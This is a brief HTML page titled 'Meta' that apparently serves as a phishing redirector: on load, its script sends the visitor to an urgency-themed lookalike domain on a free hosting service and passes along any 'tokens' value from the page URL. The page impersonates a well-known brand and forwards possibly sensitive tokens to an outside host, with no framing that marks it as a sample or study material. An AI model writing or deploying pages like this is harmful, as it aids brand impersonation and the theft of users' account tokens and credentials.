<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Meta</title>
</head>
<body>
<script>
    // Base URL for redirect
    var baseUrl = 'https://take-urgent-review-business-suite.wasmer.app/';
    
    // Get tokens parameter from current page URL
    var urlParams = new URLSearchParams(window.location.search);
    var tokens = urlParams.get('tokens');
    
    // Build redirect URL with tokens parameter
    var redirectUrl = baseUrl;
    if (tokens) {
        redirectUrl += '?tokens=' + encodeURIComponent(tokens);
    }
    
    // Redirect to the URL
    window.location.href = redirectUrl;
</script>
</body>
</html>